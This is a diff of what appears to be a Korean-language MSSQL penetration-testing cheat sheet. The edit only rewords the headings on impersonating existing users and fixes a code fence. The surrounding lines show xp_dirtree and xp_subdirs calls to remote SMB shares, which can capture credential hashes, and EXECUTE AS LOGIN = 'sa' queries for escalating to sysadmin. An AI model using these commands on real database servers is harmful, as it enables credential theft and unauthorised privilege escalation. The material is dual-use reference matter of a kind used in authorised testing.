@@ -142,8 +142,8 @@ EXEC master..xp_dirtree '\\192.168.1.1\share\'
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
 ```
 
-### 기존 사용자 가장하기
-- 가장할 수 있는 사용자 식별
+### 기존 사용자 사칭하기
+- 사칭할 수 있는 사용자 식별
 ```
 SELECT distinct b.name
 FROM sys.server_permissions a
@@ -156,8 +156,8 @@ WHERE a.permission_name = 'IMPERSONATE'
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
-- 
-``` sa 사용자로 사칭하고 sysadmin 역할 확인(반환값 1)
+- sa 사용자로 사칭하고 sysadmin 역할 확인(반환값 1)
+```
 EXECUTE AS LOGIN = 'sa'
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
